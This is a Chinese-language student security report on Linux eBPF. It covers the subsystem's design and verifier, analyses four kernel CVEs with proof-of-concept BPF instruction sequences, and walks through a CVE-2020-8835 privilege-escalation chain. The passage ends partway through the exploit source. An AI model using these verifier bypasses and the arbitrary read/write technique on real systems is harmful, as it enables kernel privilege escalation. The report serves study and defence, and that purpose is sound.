---
counter: True
comment: True
---

# 内核 eBPF 技术简介与安全漏洞分析

!!! abstract
    网络安全大作业报告，同时除去各漏洞具体复现以及 rookit 部分之外的也作为同学期“计算机科学思想史”的大作业论文。
    
    本文介绍了 Linux 内核中 eBPF 技术的起源与简介，并介绍了 eBPF 的运行逻辑和安全设计，后分析了 eBPF 相关的四个漏洞 CVE-2020-8835、CVE-2020-27194、CVE-2021-3490 和 CVE-2022-23222，分析了其原理和利用方式，并提出了 eBPF 常出现的漏洞总结，后基于 CVE-2020-8835 详细分析了绕过检测后的 eBPF 内核提权利用。最后介绍了基于 eBPF 的 rootkit 原理，并复现了 bad-bpf rootkit 的功能。

## eBPF 起源与简介

eBPF 是一项革命性的技术，起源于 Linux 内核，它可以在特权上下文中（如操作系统内核）运行沙盒程序。它用于安全有效地扩展内核的功能，而无需通过更改内核源代码或加载内核模块的方式来实现。

### BPF

BPF（Berkeley Packet Filter），即伯克利包过滤器，是类 Unix 系统上数据链路层的一种原始接口，提供原始链路层封包的收发。1992 年，McCanne 和 Jacbson 在 USENIX '93 发表了文章 *The BSD packet filter: a new architecture for user-level packet capture*，文中介绍了他们在 Unix 内核实现网络数据包过滤，BPF 技术比当时最先进的数据包过滤技术快 20 倍。BPF 在数据包过滤上引入新虚拟机的设计，并且只缓存与过滤数据包相关的数据，而不是复制数据包的所有信息，这样可以最大程度地减少 BPF 处理的数据。因为 BPF 效率提升巨大，绝大多数 \*nix 系统都选择采用 BPF 作为数据包过滤技术。BPF 工作在内核中，其结构如下图所示：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/project/img1.png" width="55%" style="margin: 0 auto;">
</div>

即直接在数据链路层捕获流量包并进行过滤，再返回给用户。BPF 通过 JIT（Just-In-Time）及时编译器将 BPF 指令编译为本机字节码进行执行，以提高执行效率。

### eBPF

在 2014 年，Alexei Starovoitov 基于先前的 BPF 实现了 eBPF（extended Berkeley Packet Filter），将原先的只用于网络包过滤的内核态过滤器扩展为了通用的内核字节码执行引擎。

eBPF 最早出现在 Linux 3.18 内核中，此后原来的 BPF 就被称为 cBPF（classic BPF），cBPF 现在已经基本废弃，原有用法也通过 eBPF 重新实现。

eBPF 在 BPF 指令集的基础上进行了扩展，使用了更多的寄存器与更大的内存空间，并且扩展了在内核执行时可以使用的系统调用。使得开发人员可以使用函数参数自由交换更多的信息，编写更复杂的程序。

BPF 只限于内核态使用，只有少部分用户程序可以编写并创建 BPF 过滤器，比如 tcpdump 和 seccomp。而 eBPF 将其扩展到了用户态，eBPF 不再局限于网络栈，而是成为了内核中的一个子系统。eBPF 程序更像一个内核模块，但比内核模块更强调安全和稳定，不需要重新编译内核，也不会造成内核崩溃。

## eBPF 原理与安全设计

### eBPF 运行逻辑

eBPF 程序是事件驱动的，也就是说，eBPF 程序通过加载一些钩子（hook）来在某些事件发生的时候触发执行。这些事件包含预定义的系统调用、函数入/出口点、内核跟踪点、网络事件等，除此之外也可以通过创建内核探针（kprobe）或者用户探针（uprobe）来在内核和用户程序的几乎所有位置加载 eBPF 程序：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/project/img2.png" width="64%" style="margin: 0 auto;">
</div>

开发者可以通过 bcc、bpftrace、eBPF Go Library、libbpf 等各种语言的 SDK 来编写 eBPF 程序并编译到 eBPF 字节码。接下来通过 bpf 系统调用将程序加载入 Linux 内核中，随后被事件触发进行执行。eBPF 程序的结果通过 maps 结构或者 event 来返回给用户，maps 是存储 eBPF 程序所使用的数据结构的空间，需要由用户进程通过 bpf 系统调用来申请创建，接下来 eBPF 程序和用户程序都可以访问这块 map，从而进行数据交换。

eBPF 程序使用一个 RISC 指令集，可以访问 R0-R10 这 11 个寄存器，对应 x64 CPU 中的 rax/rdi/rsi/rdx/rcx/r8/rbx/r13/r14/r15/rbp。并且每条指令为以下结构：

```c 
struct bpf_insn {
    __u8    code;       /* opcode */
    __u8    dst_reg:4;  /* dest register */
    __u8    src_reg:4;  /* source register */
    __s16   off;        /* signed offset */
    __s32   imm;        /* signed immediate constant */
};

// 即类似 BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2) 的形式
```

加载 eBPF 程序有以下步骤：

- 调用 `syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr))` 来申请创建一个 map；
- 调用 `syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr))` 来加载 eBPF 程序，attr 中存储指令数量、首地址和日志级别等属性；
    - 接下来会进行 eBPF 程序的验证、编译，并将其加载到内核中；

### eBPF 安全设计

eBPF 作为一种挂载在内核各种位置并在内核态执行的程序，且运行在许多关键软件基础设施组件的核心位置，其安全性至关重要。eBPF 在加载过程中通过以下过程和机制来保证安全性：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/project/img3.png" width="70%" style="margin: 0 auto;">
</div>

- 除非启用了非特权 eBPF，否则只有 root 用户或授予了 CAP\_BPF 权限的用户才能加载 eBPF 程序；
    - 意味着只有受信任的程序才能加载 eBPF 程序；
    - 而且即使开启了非特权 eBPF，其对内核的访问功能也会受到限制；
- 在进行 JIT 编译前，需要先通过 Verifier 安全验证，保证了：
    - 一个 eBPF 程序一定会运行直至结束，不会阻塞或者无限循环；
    - 程序不能使用未初始化的变量或访问越界内存；
    - 程序必须符合大小限制，并且有有限的复杂性；
- 在验证后还会进行程序的加固，进行了以下的保护：
    - 加载后的 eBPF 程序部分的内存变为只读，即不允许 eBPF 程序受到任何有意无意的修改；
    - 通过调整内存访问来缓解 Spectre 分支预测侧信道漏洞；
    - 对代码进行常量盲化（Constant Blinding），防止 JIT 喷射攻击，防止将可执行代码作为常量注入等；
- 运行时限制内核内存访问：
    - eBPF 不能直接访问任意内核内存，只能通过 helper 函数来访问程序外的内存，保证了数据一致性；
        - helper 是内核提供的一组通用且稳定的 API，为 eBPF 提供了扩展的功能；
    - eBPF 通过 Maps 来存储和检索各种数据结构中的数据，使得程序本身和用户空间都可以进行访问。

## eBPF 技术相关安全漏洞分析

虽然 eBPF 通过 Verifier 等多种手段保证了其安全性，但毕竟其处于内核态运行而且功能代码复杂，所以不可避免的会出现一些漏洞。下面介绍一些 eBPF 曾出现过的漏洞及其基本原理。

### CVE-2020-8835

这个漏洞由 Manfred Paul 于 2020 年在 Pwn2Own 上提出，利用 eBPF 的漏洞是下了 Linux 系统的提权。漏洞的原理是在 verifier 进行寄存器检查时带有漏洞，可以使得通过某些指令序列来绕过寄存器值检查。

我们知道 verifier 会进行程序安全性的检查，其中就包括了访存的合法性检查，为了检查访问的地址，则需要检查寄存器的值，记录其可能出现的值的范围。在代码中，verifier 通过 `bpf_reg_state` 结构体来记录寄存器状态，其中包括 {s,u}{min,max}_value 来记录有无符号下的最大最小值，并用一个 `tnum` 结构体来保存可能值：

```c 
struct bpf_reg_state {
    ...
    struct tnum var_off;
    s64 smin_value;
    s64 smax_value;
    u64 umin_value;
    u64 umax_value;
    ...
}

struct tnum {
    u64 value; // 某一 bit 为 1，则表示这个 bit 确定为 1
    u64 mask;  // 某一 bit 为 1，则表示这个 bit 的值不确定
}
```

漏洞出现的函数为：

```c 
static void __reg_bound_offset32(struct bpf_reg_state *reg){
    u64 mask = 0xffffFFFF;
    struct tnum range = tnum_range(reg->umin_value & mask,
                       reg->umax_value & mask);
    struct tnum lo32 = tnum_cast(reg->var_off, 4);
    struct tnum hi32 = tnum_lshift(tnum_rshift(reg->var_off, 32), 32);

    reg->var_off = tnum_or(hi32, tnum_intersect(lo32, range));
}
```

这个函数会在进行寄存器 32 位操作后更新寄存器状态使用。这里新建了一个 tnum range，然后根据无符号的范围更新了 var_off。但这里创建 range 的时候直接取了 64 位值的低 32 位，这样如果无符号的范围是 0x1 - 0x1_0000_0001，则截断后为 0x1 - 0x1，这样 var_off 中就会确定这个寄存器的值一定为 1。

比如如下利用流程：

```c 
BPF_LDX_MEM(BPF_DW, REG_6, REG_9, 0) // r6 = mem[r9+0]
```

之后 r6 因为是从内存中读取出来的值，所以 verifier 不确定，`tnum.value` 也就为 0。接下来我们可以通过操作来使得 r6 的 umin_value 为 1：

```c 
BPF_JMP_IMM(BPF_JGE, REG_6, 1, 1) // if r6 >= 1 goto +1
BPF_EXIT_INSN()                   // exit
```

这样如果没有 exit，则 r6 一定大于等于 1，所以 umin_value 就变为了 1。同理通过 JMP 配合 BPF_JLE，我们可以为 r6 设置 umax_value 为 0x1_0000_0001。然后就可以通过 JMP32 来触发漏洞：

```c 
BPF_JMP32_IMM(BPF_JNE, REG_6, 5, 1) // if r6 != 5 goto +1
BPF_EXIT_INSN()                     // exit
```

JMP32 后会对 r6 调用 `__reg_bound_offset32`，这样 r6 得到的新 var_off 就会因为 umin_value 和 umax_value 截断至 32 位而确定为 1。因此无论 r6 的初始值为多少（只要在 0x1 - 0x1_0000_0001 之间），都会被 verifier 确认为 1，从而绕过了寄存器值检查。

而利用方法也很显然，我们只要令最开始的 r6 值为 2，这样在操作后 r6 的实际值还是 2，但 verifier 认为其是 1。然后我们将 r6 右移一位，这样 r6 实际值为 1 但 verifier 为认为其为 0。然后我们就可以为 r6 乘任意值来得到任意值，而 verifier 始终认为其为 0，接下来就可以进行越界的任意地址读写，从而实现提权。

解决漏洞的方式也很显然，`__reg_bound_offset32` 是为了对 32 位指令优化而引入的，但对于值的截断处理并不可取，所以删掉这个函数，对所有指令都进行 64 位的更新即可解决。

### CVE-2020-27194

这个漏洞是由 Simon 在 fuzz Linux 的 ebpf 模块的时候发现的一个越界读写漏洞，后由 360 安全实现该漏洞的提权利用。漏洞的原理和前面的 CVE-2020-8835 非常类似，也是执行 32 位指令后更新寄存器值出现了截断错误。

在 CVE-2020-8835 后，研究人员也发现了只保存 64 位取值的话有一些包含 32 位操作的指令序列即使是合法的可能也不会通过 verifier 的检查，所以位 `bpf_reg_state` 结构体中添加了 {s,u}32_{min,max}_value 四个字段来记录低 32 位的取值范围，并为每条指令分别更新 32 位和 64 位的取值范围。而本漏洞的问题在于 `scalar32_min_max_or` 函数，这个函数中会意外截断：

```c 
static void scalar32_min_max_or(struct bpf_reg_state *dst_reg,
                struct bpf_reg_state *src_reg)
{
    ...
    } else {
        /* ORing two positives gives a positive, so safe to
         * cast result into s64.
         */
        dst_reg->s32_min_value = dst_reg->umin_value;
        dst_reg->s32_max_value = dst_reg->umax_value;
    }
}
```

在函数的末尾本打算将 32 位的无符号值写回 32 位有符号值的范围中（因为确定了都是正数，不会出现溢出），但代码中写的是 umin_value 和 umax_value，即 64 位的无符号范围，这样这里就会直接截断，导致和 CVE-2020-8835 一样的问题。比如如下 PoC：

```c 
BPF_LDX_MEM(BPF_DW, REG_5, REG_4, 0)    // r5 = mem[r4+0]
BPF_JMP_IMM(BPF_JGT, REG_5, 0, 1)       // if r5 > 0 goto +1
BPF_EXIT_INSN()                         // exit
BPF_LD_IMM64(REG_6, 0x100000001)        // r6 = 0x100000001
BPF_JMP_REG(BPF_JLT, REG_5, REG_6, 1)   // if r5 < r6 goto +1
BPF_EXIT_INSN()                         // exit
```

这样我们就可以设置 r5 的 64 位范围为 0x1 - 0x1_0000_0001，接下来我们通过 or 来触发这个漏洞：

```c 
BPF_ALU64_IMM(BPF_OR, REG_5, 0)         // r5 = r5 | 0
BPF_MOV32_REG(REG_7, REG_5)             // r7 = r5(low 32)
```

前一条指令进行了 or 运算，verifier 会调用 `scalar32_min_max_or` 和 `scalar_min_max_or` 来更新，但 32 位版本的末尾设置 s32_max_value 的时候出现了截断，0x1_0000_0001 被截断为了 0x1，这也就让 verifier 认为 r5 的低 32 为值就是 1，然后我们通过 MOV32 指令就可以将其值赋值到 64 位寄存器中。

同理像 CVE-2020-8835 一样利用，令 r5 值为 2，verifier 会将其认为 1，接下来右移一位再乘以任意值就可以实现任意地址的读写，从而实现提权。

### CVE-2021-3490

这个漏洞也为 Manfred Paul 发现，和 CVE-2020-27194 一样都是 verifier 检查寄存器 32 位值范围时出现了错误设置。本漏洞的问题在于对于 ALU 运算指令，如果 src 和 dst 值都完全确定，则 32 位更新函数会直接返回（因为开发者假设 64 位的函数会更新范围），而 64 位更新函数会调用 `__mark_reg_known` 函数来设置 64 和 32 位的范围为同样的值：

```c 
static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,
                 struct bpf_reg_state *src_reg)
{
    ...
    if (src_known && dst_known)
        return;
    ...
}

static void scalar_min_max_and(struct bpf_reg_state *dst_reg,
                   struct bpf_reg_state *src_reg)
{
    ...
    if (src_known && dst_known) {
        __mark_reg_known(dst_reg, dst_reg->var_off.value &
                      src_reg->var_off.value);
        return;
    }
    ...
}

static void __mark_reg_known(struct bpf_reg_state *reg, u64 imm)
{
    ...
    reg->smin_value = (s64)imm;
    reg->smax_value = (s64)imm;
    reg->umin_value = imm;
    reg->umax_value = imm;

    reg->s32_min_value = (s32)imm;
    reg->s32_max_value = (s32)imm;
    reg->u32_min_value = (u32)imm;
    reg->u32_max_value = (u32)imm;
}
```

但是在低 32 位确定的情况下，64 位不一定都确定，所以可能并不会调用到 `__mark_reg_known` 来更新范围，这样在 `adjust_scalar_min_max_vals` 函数末尾更新寄存器边界的时候就会出现问题：

```c 
static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
                      struct bpf_insn *insn,
                      struct bpf_reg_state *dst_reg,
                      struct bpf_reg_state src_reg)
{
    ...
    case BPF_AND:
        dst_reg->var_off = tnum_and(dst_reg->var_off, src_reg.var_off);
        scalar32_min_max_and(dst_reg, &src_reg);
        scalar_min_max_and(dst_reg, &src_reg);
        break;
    ...
    __update_reg_bounds(dst_reg); // 调用 __update_reg32_bounds 和 __update_reg64_bounds
    ...
}

static void __update_reg32_bounds(struct bpf_reg_state *reg)
{
    struct tnum var32_off = tnum_subreg(reg->var_off);

    /* min signed is max(sign bit) | min(other bits) */
    reg->s32_min_value = max_t(s32, reg->s32_min_value, var32_off.value | (var32_off.mask & S32_MIN));
    /* max signed is min(sign bit) | max(other bits) */
    reg->s32_max_value = min_t(s32, reg->s32_max_value, var32_off.value | (var32_off.mask & S32_MAX));
    reg->u32_min_value = max_t(u32, reg->u32_min_value, (u32)var32_off.value);
    reg->u32_max_value = min(reg->u32_max_value, (u32)(var32_off.value | var32_off.mask));
}
```

比如我们可以构造 r2，其 mask 为 0xffffffff_00000000、value 为 0x1，即只有低 32 位确定为 1，再构造 r3 完全确定为 0x1_00000002。接下来我们对 r2 和 r3 进行 AND，会有以下几个步骤：

- `tnum_and` 函数会更新 r2 的寄存器状态，其 mask 为 0x1_00000000，value 为 0，即只有第 32 位不确定，其他都为 0
- `scalar32_min_max_and` 函数会直接返回，因为 r2 和 r3 的低 32 位都完全确定
- `scalar_min_max_and` 函数不会调用到 `__mark_reg_known`，因为 r2 的 64 位值并不完全确定
- `__update_reg32_bounds` 函数会更新 r2 的 32 位范围
    - 因为 var_off32.value = 0 < s32_min_value = 1，所以 s32_min_value 不变
    - 因为 var_off32.value = 0 < s32_max_value = 1，所以 s32_max_value 变为 0
    - u32_min_value 和 u32_max_value 同理

这样下来的结果就是 r2 的 32 位范围都变为了最大为 0 最小为 1，会出现检查错误。同样利用即可绕过 verifier 的检查实现任意地址读写。解决方式也是为 `scalar32_min_max_and` 函数在 src 和 dst 都确定的情况下添加 `__mark_reg32_known` 函数的调用设置边界即可。

### CVE-2022-23222

这个漏洞由 tr3e 在 2022 年 1 月发现并上报，这个漏洞和前三个漏洞略有不同，但也是在 verifier 程序中出现了遗漏的检查导致的。

Verifier 在检查使用指针的指令时会对指令是否有效进行检查。比如在调用 `bpf_map_lookup_elem()` 函数后，如果不判断结果是否为 NULL 则无法使用这个结果，因为 verifier 验证这可能是个 NULL 指针，如果使用了的话会拒绝加载。关于指针是否有效，verifier 通过 `enum bpf_reg_type` 来记录寄存器中值的类型，这部分代码如下：

```c 
enum bpf_reg_type {
    NOT_INIT = 0,         /* nothing was written into register */
    SCALAR_VALUE,         /* reg doesn't contain a valid pointer */
    PTR_TO_CTX,           /* reg points to bpf_context */
    CONST_PTR_TO_MAP,     /* reg points to struct bpf_map */
    PTR_TO_MAP_VALUE,     /* reg points to map element value */
    PTR_TO_MAP_VALUE_OR_NULL,  /* points to map elem value or NULL */
    PTR_TO_SOCKET,        /* reg points to struct bpf_sock */
    PTR_TO_SOCKET_OR_NULL,      /* reg points to struct bpf_sock or NULL */
    PTR_TO_SOCK_COMMON,   /* reg points to sock_common */
    PTR_TO_SOCK_COMMON_OR_NULL, /* reg points to sock_common or NULL */
    PTR_TO_TCP_SOCK,      /* reg points to struct tcp_sock */
    PTR_TO_TCP_SOCK_OR_NULL,    /* reg points to struct tcp_sock or NULL */
    PTR_TO_MEM,           /* reg points to valid memory region */
    PTR_TO_MEM_OR_NULL,   /* reg points to valid memory region or NULL */
    PTR_TO_RDONLY_BUF,    /* reg points to a readonly buffer */
    PTR_TO_RDONLY_BUF_OR_NULL,  /* reg points to a readonly buffer or NULL */
    PTR_TO_RDWR_BUF,      /* reg points to a read/write buffer */
    PTR_TO_RDWR_BUF_OR_NULL,    /* reg points to a read/write buffer or NULL */
    ...
};
```

可以发现对于指针类型，会存在一些以 `_OR_NULL` 结尾的类型，表示这个指针的值未知，可能为 NULL。然后 verifier 就会限制这些 `_OR_NULL` 类型的指针的使用，其可以进行的操作非常有限。只有在与 NULL 进行不等的比较后才可以去掉 `_OR_NULL`，这样 verifier 才能确定这个指针不为 NULL。

前三个漏洞中的更新是针对标量（不带指针）的 ALU 运算检测，函数为 `adjust_scalar_min_max_vals()`，而本漏洞中存在问题的函数是针对指针类型的 ALU 运算检查 `adjust_ptr_min_max_vals()`。为了禁止对于可能为 NULL 的指针进行操作，在该函数的开头进行了检查：

```c
static int adjust_ptr_min_max_vals(struct bpf_verifier_env *env,
                   struct bpf_insn *insn,
                   const struct bpf_reg_state *ptr_reg,
                   const struct bpf_reg_state *off_reg)
{
...
    switch (ptr_reg->type) {
    case PTR_TO_MAP_VALUE_OR_NULL:
        verbose(env, "R%d pointer arithmetic on %s prohibited, null-check it first\n",
            dst, reg_type_str[ptr_reg->type]);
        return -EACCES;
    case CONST_PTR_TO_MAP:
        /* smin_val represents the known value */
        if (known && smin_val == 0 && opcode == BPF_ADD)
            break;
        fallthrough;
    case PTR_TO_PACKET_END:
    case PTR_TO_SOCKET:
    case PTR_TO_SOCKET_OR_NULL:
    case PTR_TO_SOCK_COMMON:
    case PTR_TO_SOCK_COMMON_OR_NULL:
    case PTR_TO_TCP_SOCK:
    case PTR_TO_TCP_SOCK_OR_NULL:
    case PTR_TO_XDP_SOCK:
        verbose(env, "R%d pointer arithmetic on %s prohibited\n",
            dst, reg_type_str[ptr_reg->type]);
        return -EACCES;
    default:
        break;
    }
...
}
```

可见如果是一些 `_OR_NULL` 的指针，则会直接返回错误导致加载失败。但问题在于这个 switch 并没有对所有 `bpf_reg_type` 进行检查，比如 `PTR_TO_MEM_OR_NULL` `PTR_TO_RDONLY_BUF_OR_NULL` `PTR_TO_RDWR_BUF_OR_NULL` 等类型就并没有被检查，这样就会导致这些指针可以被用于运算，从而绕过 verifier 的检查。

接下来利用这个漏洞，我们通过调用 `BPF_FUNC_ring_reserve` 函数来得到一个 `PTR_TO_MEM_OR_NULL` 类型的指针，通过传入参数 0xfff...fff 我们可以得到 NULL 值的结果，假设为 r0。接下来我们将 r0 复制到 r1，再对 r1 加 1，然后再对 r0 进行 NULL 检查，接下来 verifier 就会认为 r0 和 r1 都是 0 值。然后我们就可以像前三个漏洞一样对 r1 乘以任意值来实现任意地址读写，从而实现提权。

### eBPF 安全漏洞总结

eBPF 作为一个强大的内核态执行引擎，其安全性至关重要。通过 verifier、JIT 编译器、内存访问限制等多种手段，eBPF 保证了其安全性。但是在实际使用中，由于其复杂性和功能性，不可避免的会出现一些漏洞。这些漏洞大多是由于 verifier 在检查时遗漏了一些情况，导致了一些不符合规范的程序被加载。这些漏洞的利用方式也大多是通过构造一些特殊的指令序列来绕过 verifier 的检查，从而实现提权。

根据前面对于四个漏洞的分析，再加上在 NVD 上搜索查阅了 eBPF 相关会造成内核提权的严重漏洞（CVE-2021-3600、CVE-2021-3489、CVE-2021-4204、CVE-2021-31440、CVE-2021-34866、CVE-2023-39191、CVE-2022-0500），我们可以发现 eBPF 相关漏洞经常出现于：

- Verifier 对于 BPF 指令集中 32 位操作指令不能正确跟踪寄存器低 32 位值边界信息
    - CVE-2020-8835、CVE-2020-27194、CVE-2021-3600、CVE-2021-31440
- Verifier 缺乏对于指针类型操作的检验，或变量类型混淆
    - CVE-2022-23222、CVE-2023-39191、CVE-2021-34866
- eBPF helper 函数缺乏检测，导致通过参数越界读写
    - CVE-2021-3489、CVE-2021-4204
- eBPF 程序不受限制的加载方式
    - CVE-2022-0500（通过 BTF 加载导致的越界访问）

Mohamed 等人的研究 *Understanding the Security of Linux eBPF Subsystem* 中也统计了 eBPF 漏洞所有 CVE 出现的位置，结果如下：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/project/img4.png" width="50%" style="margin: 0 auto;">
</div>

可见将近一半的漏洞出现于 verifier 上，特别是对于 ALU 指令的检测上，其次是 helper 函数，接下来才是 eBPF 相关 core 代码。这也说明了 eBPF 的漏洞主要还是出现在 verifier 上，所以为了提高 eBPF 的安全性，我们可以增加对于 verifier 和 helper 函数的审计与 fuzz 测试，关注检验过程中的寄存器值边界问题，并关注指针类型的操作，并且在后续 eBPF 的扩展中也注意这些经常发生的问题，以免对于内核安全造成巨大影响。

## eBPF 漏洞提权利用分析

接下来我们基于 CVE-2020-8835 的漏洞来进一步分析，仅通过绕过 verifier 的寄存器值边界检查，该如何进行进一步的利用，实现地址泄漏、任意地址读写、内核提权等结果。

### 地址泄漏原理

当使用 `bpf_create_map` 创建数组类型的 map 的时候，实际会调用内核中的 `map_create` 函数来创建如下的一个 `bpf_array` 结构体：

```c 
struct bpf_array {
    struct bpf_map map;
    u32 elem_size;
    u32 index_mask;
    struct bpf_array_aux *aux;
    union {
        char value[];
        void *ptrs[];
        void *pptrs[];
    };
}
```

我们实际可控的，也就是实际读写访问的内存是最后的 union 也就是一个变长的 value 数组，正常情况下 verifier 会检查对这些的访存地址，只有落在 value 内的部分才能访存，否则会不通过验证、加载错误。

但根据前面我们的分析，我们可以通过一系列的操作来使得一个寄存器的值绕过 verifier 的检查，假设我们令 r6 为 0x110，但 verifier 认为其为 0，那这样如果我们访问 `bpf_array.value[0-r6]`，verifier 会认为其访问的是 `value[0]` 没有问题。而 value 在结构体中的偏移是 0x110，所以 -0x110 就可以访问到结构体的开头，也就是 `bpf_map` 结构体的内容：

```c 
struct bpf_map {
    const struct bpf_map_ops *ops;
    struct bpf_map *inner_map_meta;
    void *security;
    enum bpf_map_type map_type;
    //....
    u64 writecnt;
}
```

其中 array 类型的 map 的 `bpf_map_ops` 是一个内核中的常量地址，所以我们可以通过读取 value-0x110 处的值来泄漏出内核地址。

### 任意地址读原理

任意地址读利用的是 bpf 系统调用的 BPF_OBJ_GET_INFO_BY_FD 功能，其内核调用的代码为：

```c 
static int bpf_map_get_info_by_fd(struct bpf_map *map,
                  const union bpf_attr *attr,
                  union bpf_attr __user *uattr)
{
    struct bpf_map_info __user *uinfo = u64_to_user_ptr(attr->info.info);
    struct bpf_map_info info = {};
    u32 info_len = attr->info.info_len;
    ...
        if (map->btf) {
            info.btf_id = btf_id(map->btf);
            info.btf_key_type_id = map->btf_key_type_id;
            info.btf_value_type_id = map->btf_value_type_id;
        }
    ...
        if (copy_to_user(uinfo, &info, info_len) ||
            put_user(info_len, &uattr->info.info_len))
            return -EFAULT;
    return 0;
}
```

其中 `map->btf` 是一个 BTF 结构体的指针，而 `btf_id` 函数是读取这个结构体的 id 值，而 id 位于该结构体的 0x58 偏移处。所以只要我们修改 `map->btf` 为 target-0x58，这样 `btf_id` 就会访问 target 处的值。

`btf_map` 这个结构体在前面我们就已经可以根据漏洞来完全访问了，而其中 0x40 偏移的位置就是 btf 指针，所以我们在前面泄漏 ops 的基础上加 0x40 并覆盖为 target-0x58 就可以修改 `map->btf` 了。而在函数的的末尾，会将访问的结果拷贝到用户空间，其中 `btf_id` 字段在 `bpf_map_info` 结构体的 0x40 偏移处，所以在我们得到结果后，其 0x40 位置处就是我们想要访问的 target 地址处的值，也就实现了任意地址读。

### 任意地址写原理

既然我们可以任意修改 `bpf_map` 结构体中的值，所以我们也可以劫持 `bpf_map_ops`，覆盖这个指针，就可以让内核在调用其中函数的时候调用到我们构造的其他函数指针的地址。然后我们想办法通过调用来进行任意地址写就可以了。

我们选择使用 stack 类型的 map，这样就可以通过 `bpf_update_elem` 调用到 `map_update_elem` 函数，然后从 ops 中取出 `map_push_elem` 函数指针来调用，我们就可以更改 `map_push_elem` 位置上的指针指，使其调用到 `map_get_next_key` 函数。

为了将 map 改为 stack 类型，我们也是直接修改 `bpf_map` 结构体的内容即可，我们需要修改：

- 0x18 偏移上的 `map_type`，修改为 BPF_MAP_TYPE_STACK
- 0x24 偏移上的 `max_entries`，修改为 0xffffffff，即 -1
- 0x2c 偏移上的 `spin_lock_off`，修改为 0

然后劫持 ops 指针，覆盖其中的 `map_push_elem` 元素为 `map_get_next_key` 函数指针：

```c 
const struct bpf_map_ops stack_map_ops = {
    .map_alloc_check = queue_stack_map_alloc_check,
    .map_alloc = queue_stack_map_alloc,
    .map_free = queue_stack_map_free,
    .map_lookup_elem = queue_stack_map_lookup_elem,
    .map_update_elem = queue_stack_map_update_elem,
    .map_delete_elem = queue_stack_map_delete_elem,
    .map_push_elem = queue_stack_map_push_elem,  // 修改为 map_get_next_key
    .map_pop_elem = stack_map_pop_elem,
    .map_peek_elem = stack_map_peek_elem,
    .map_get_next_key = queue_stack_map_get_next_key,
};
```

然后在执行 `map_get_next_key` 函数时，会发生内存的写入：

```c 
static int array_map_get_next_key(struct bpf_map *map, void *key, void *next_key)
{
    struct bpf_array *array = container_of(map, struct bpf_array, map);
    u32 index = key ? *(u32 *)key : U32_MAX;
    u32 *next = (u32 *)next_key;
    if (index >= array->map.max_entries) {\
        *next = 0;
        return 0;
    }
    if (index == array->map.max_entries - 1)
        return -ENOENT;
    *next = index + 1; // *(u32 *)next_key = *(u32 *)key + 1
    return 0;
}
```

修改 `max_entries` 和 `spin_lock_off` 是为了能正常执行到函数最后，在最后根据分析，会进行内存写，即取出第一个参数的 u32 值加上 1 再存到第二个参数的位置处。我们执行到此的调用链为：

```c 
bpf_update_elem(mapfd, &key, &value, flags)
-> map_update_elem(mapfd, &key, &value, flags)
-> map_push_elem(struct bpf_map *map, void *value, u64 flags)
    （实际上劫持后是 map_get_next_key）
-> array_map_get_next_key(struct bpf_map *map, void *key, void *next_key) 
```

所以对应起来，我们传入的 value 就是最后的 key，flags 就是最后的 next_key，所以我们构造 value 和 flags 就可以实现 `*(u32*)flags = *(u32*)value + 1` 的写入，而这些都是我们可控的用户输入，所以就可以实现任意地址写。

### exp 程序分析

首先需要创建一些 map 并加载 eBPF 程序：

```c 
static void prep(void) {
    ctrl_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x100, 1, 0);
    exp_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x2000, 1, 0);
    progfd = load_my_prog();
    ...
    if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)){
        __exit(strerror(errno));
    }
    if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0){
        __exit(strerror(errno));
    }
}

static int load_my_prog() {
    struct bpf_insn my_prog[] = {
        ... // eBPF 程序字节码
    };
    return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, my_prog, sizeof(my_prog), "GPL", 0);
}
```

创建的 ctrl_map 用于作为对程序的传参，exp_map 用于实际利用。在加载程序后，通过 socketpair 创建 socket，通过 setsockopt 将 eBPF 程序加载到 socket 上，这样后续就可以通过对 socket[0] 的 write 触发 eBPF 程序运行：

```c 
static void execute(void) {
    char buffer[64];
    ssize_t n = write(sockets[0], buffer, sizeof(buffer));
    ...
}
```

接下来我们分析 eBPF 程序：

```c
// Part 1 (trigger vulnerability)
BPF_LD_MAP_FD(BPF_REG_9,ctrl_mapfd),            // r9 = ctrl_mapfd
BPF_MAP_GET(0,BPF_REG_8),                       // r8 = ctrl_buf[0] (0x?000..00110)
BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),            // r6 = r0             

BPF_LD_IMM64(BPF_REG_2,0x4000000000),           // r2 = 0x4000000000
BPF_LD_IMM64(BPF_REG_3,0x2000000000),           // r3 = 0x2000000000
BPF_LD_IMM64(BPF_REG_4,0xFFFFffff),             // r4 = 0xFFFFffff
BPF_LD_IMM64(BPF_REG_5,0x1),                    // r5 = 0x1

BPF_JMP_REG(BPF_JGT,BPF_REG_8,BPF_REG_2,5),     // if r8 > 0x4000000000 goto +5 (exit(0))
BPF_JMP_REG(BPF_JLT,BPF_REG_8,BPF_REG_3,4),     // if r8 < 0x2000000000 goto +4 (exit(0))
BPF_JMP32_REG(BPF_JGT,BPF_REG_8,BPF_REG_4,3),   // if w8 > 0xFFFFffff goto +3 (exit(0))
BPF_JMP32_REG(BPF_JLT,BPF_REG_8,BPF_REG_5,2),   // if w8 < 0x1 goto +2 (exit(0))

BPF_ALU64_REG(BPF_AND,BPF_REG_8,BPF_REG_4),     // r8 = r8 & 0xFFFFffff (0x110，但 verifier 已经认为其就是 0)
BPF_JMP_IMM(BPF_JA, 0, 0, 2),                   // goto +2 (Part 2)

BPF_MOV64_IMM(BPF_REG_0,0x0),                   // r0 = 0
BPF_EXIT_INSN(),                                // exit(0) (r8 不满足条件)
```

